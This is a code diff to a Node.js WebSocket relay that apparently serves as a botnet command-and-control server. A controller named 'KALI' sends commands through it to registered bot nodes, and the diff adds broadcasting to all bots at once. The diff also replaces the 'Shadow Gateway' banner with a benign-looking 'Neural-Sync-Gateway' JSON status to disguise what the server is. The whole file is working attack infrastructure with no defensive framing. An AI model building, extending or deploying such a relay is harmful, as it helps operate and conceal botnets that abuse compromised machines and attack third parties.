@@ -2,8 +2,8 @@ const WebSocket = require('ws');
 const http = require('http');
 
 const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Shadow Gateway v2.0 - Active');
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: "running", api: "v2.0.4", service: "Neural-Sync-Gateway" }));
 });
 
 const wss = new WebSocket.Server({ server });
@@ -17,11 +17,11 @@ wss.on('connection', (ws, req) => {
     if (id === 'KALI') {
         if (KALI) KALI.terminate();
         KALI = ws;
-        console.log('[+] Orquestrador Conectado');
+        console.log('[+] Orquestrador Master Conectado');
         BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
     } else if (id) {
         BOTS.set(id, ws);
-        console.log(`[+] Nó registrado: ${id}`);
+        console.log(`[+] Novo Nó de Processamento: ${id}`);
         if (KALI && KALI.readyState === WebSocket.OPEN) KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
     }
 
@@ -29,9 +29,15 @@ wss.on('connection', (ws, req) => {
         try {
             const data = JSON.parse(message);
             if (ws === KALI) {
-                const target = BOTS.get(data.to);
-                if (target) target.send(JSON.stringify(data.cmd));
+                // Se to for 'ALL', envia para todos os nós
+                if (data.to === 'ALL') {
+                    BOTS.forEach(client => client.send(JSON.stringify(data.cmd)));
+                } else {
+                    const target = BOTS.get(data.to);
+                    if (target) target.send(JSON.stringify(data.cmd));
+                }
             } else if (KALI && KALI.readyState === WebSocket.OPEN) {
+                // Retorno do Bot para o Kali (Resultados do processamento)
                 KALI.send(JSON.stringify({ t: 'res', f: id, d: data }));
             }
         } catch (e) {
@@ -54,4 +60,4 @@ wss.on('connection', (ws, req) => {
 });
 
 const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => console.log(`Relay ativo na porta ${PORT}`));
+server.listen(PORT, () => console.log(`Shadow Relay v2.0 ativo na porta ${PORT}`));
